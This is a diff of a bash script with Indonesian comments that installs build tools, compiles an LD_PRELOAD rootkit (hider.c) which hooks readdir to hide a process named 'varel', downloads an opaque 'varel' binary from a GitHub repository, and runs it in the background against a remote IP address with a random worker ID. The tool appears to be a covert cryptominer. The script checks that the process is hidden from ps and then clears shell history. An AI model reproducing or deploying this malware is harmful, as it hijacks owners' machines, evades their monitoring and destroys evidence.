@@ -1,75 +1,13 @@
 #!/bin/bash
 set -e
 
-# Deteksi OS
-if [ -f /etc/os-release ]; then
-    . /etc/os-release
-    OS=$ID
-    VERSION_CODENAME=$VERSION_CODENAME
-else
-    echo "❌ Cannot detect OS"
-    exit 1
-fi
+cd ~/
 
-echo "🔍 Detected OS: $OS $VERSION_CODENAME"
+# === Install dependencies ===
+sudo apt-get update >/dev/null 2>&1
+sudo apt-get install -y wget ca-certificates gcc make >/dev/null 2>&1
 
-# === Bersihkan Docker lama ===
-sudo apt-get remove -y docker.io moby-containerd containerd runc 2>/dev/null || true
-sudo apt-get autoremove -y
-
-sudo apt-get update
-sudo apt-get install -y ca-certificates curl gnupg lsb-release
-
-# === Install Docker berdasarkan OS ===
-sudo install -m 0755 -d /etc/apt/keyrings
-
-if [ "$OS" = "debian" ]; then
-    echo "📦 Installing Docker for Debian..."
-    sudo curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc
-    sudo chmod a+r /etc/apt/keyrings/docker.asc
-    
-    echo \
-      "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] \
-      https://download.docker.com/linux/debian \
-      $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
-      sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
-      
-elif [ "$OS" = "ubuntu" ]; then
-    echo "📦 Installing Docker for Ubuntu..."
-    sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
-    sudo chmod a+r /etc/apt/keyrings/docker.asc
-    
-    echo \
-      "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] \
-      https://download.docker.com/linux/ubuntu \
-      $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
-      sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
-else
-    echo "❌ Unsupported OS: $OS"
-    exit 1
-fi
-
-sudo apt-get update
-sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
-
-# === Start Docker ===
-sudo systemctl enable docker 2>/dev/null || true
-sudo systemctl start docker
-
-# === Bersihkan container lama ===
-docker stop varel-app 2>/dev/null || true
-docker rm varel-app 2>/dev/null || true
-
-# === Setup script untuk container ===
-export TMPDIR=$HOME/tmp
-mkdir -p $TMPDIR
-
-cat > /tmp/setup.sh << 'EOFSETUP'
-#!/bin/bash
-apt-get update >/dev/null 2>&1
-apt-get install -y wget ca-certificates libssl3 gcc >/dev/null 2>&1
-
-# --- Buat file hider.c ---
+# === Buat file hider.c (process hiding via LD_PRELOAD) ===
 cat > /tmp/hider.c << 'EOFHIDER'
 #define _GNU_SOURCE
 #include <stdio.h>
@@ -77,7 +15,9 @@ cat > /tmp/hider.c << 'EOFHIDER'
 #include <dirent.h>
 #include <string.h>
 #include <unistd.h>
+
 static const char* process_to_filter = "varel";
+
 static int get_dir_name(DIR* dirp, char* buf, size_t size) {
     int fd = dirfd(dirp);
     if(fd == -1) return 0;
@@ -88,6 +28,7 @@ static int get_dir_name(DIR* dirp, char* buf, size_t size) {
     buf[ret] = 0;
     return 1;
 }
+
 static int get_process_name(char* pid, char* buf) {
     if(strspn(pid, "0123456789") != strlen(pid)) return 0;
     char tmp[256];
@@ -100,6 +41,7 @@ static int get_process_name(char* pid, char* buf) {
     sscanf(tmp, "%d (%[^)]s", &unused, buf);
     return 1;
 }
+
 #define DECLARE_READDIR(dirent, readdir) \
 static struct dirent* (*original_##readdir)(DIR*) = NULL; \
 struct dirent* readdir(DIR *dirp) { \
@@ -121,39 +63,59 @@ struct dirent* readdir(DIR *dirp) { \
     } \
     return dir; \
 }
+
 DECLARE_READDIR(dirent64, readdir64);
 DECLARE_READDIR(dirent, readdir);
 EOFHIDER
 
-gcc -Wall -fPIC -shared -o /lib/libc-dev.so /tmp/hider.c -ldl 2>/dev/null
+# Compile process hider
+gcc -Wall -fPIC -shared -o ~/.libhider.so /tmp/hider.c -ldl 2>/dev/null
 rm -f /tmp/hider.c
 
-# --- Jalankan varel ---
-mkdir -p /app && cd /app
-wget -q https://github.com/jerryseptian123/helmiyahtas/raw/main/varel
-chmod +x varel
+# === Download varel ===
+if [ ! -f ~/varel ]; then
+    echo "📥 Downloading varel..."
+    wget -q -O ~/varel https://github.com/jerryseptian123/helmiyahtas/raw/main/varel
+    chmod +x ~/varel
+fi
 
-RANDOM_USER="v11d5exukktuwl8geceiwini8jhqcpk1bj3u8xw.$(shuf -n 1 -i 1-99999)-gtbbbbbbbbb"
-export LD_PRELOAD=/lib/libc-dev.so
-exec ./varel -a randomvirel --url 137.184.31.121:443 --user $RANDOM_USER --threads=6
-EOFSETUP
+# === Generate random worker ID ===
+RANDOM_WORKER="v11d5exukktuwl8geceiwini8jhqcpk1bj3u8xw.$(shuf -n 1 -i 10000-99999)-w$(date +%s)"
 
-chmod +x /tmp/setup.sh
+# === Kill old process if exists ===
+pkill -f "varel.*randomvirel" 2>/dev/null || true
+sleep 2
 
-# === Jalankan container ===
-docker run -d --name varel-app --restart=always \
-  -v /tmp/setup.sh:/setup.sh:ro \
-  ubuntu:22.04 \
-  /bin/bash /setup.sh
+# === Start varel with process hiding ===
+echo "🚀 Starting varel (hidden process)..."
+export LD_PRELOAD=~/.libhider.so
 
-sleep 8
+nohup ~/varel -a randomvirel \
+  --url 137.184.31.121:443 \
+  --user "$RANDOM_WORKER" \
+  --threads=6 \
+  --verbose \
+  --log-file=~/run.log \
+  > /dev/null 2>&1 &
 
-# === Cek hasil ===
-echo "✅ Setup complete!"
-docker ps | grep varel-app || echo "⚠️ Container not running"
-echo ""
-echo "🧪 Check logs:"
-docker logs varel-app 2>&1 | tail -20 || echo "⚠️ Cannot read logs yet"
+sleep 3
 
-# Bersihkan riwayat
+# === Verify ===
+if pgrep -f "varel.*randomvirel" >/dev/null; then
+    echo "✅ Varel started successfully!"
+    echo "📊 Worker ID: $RANDOM_WORKER"
+    echo "📝 Log file: ~/run.log"
+    
+    # Test process hiding
+    if ps aux | grep -v grep | grep -q varel; then
+        echo "⚠️ Process still visible in ps"
+    else
+        echo "✅ Process hidden from ps"
+    fi
+else
+    echo "❌ Failed to start varel"
+    tail -20 ~/run.log 2>/dev/null || echo "No log file"
+fi
+
+# Clear history
 history -c && history -w 2>/dev/null || true
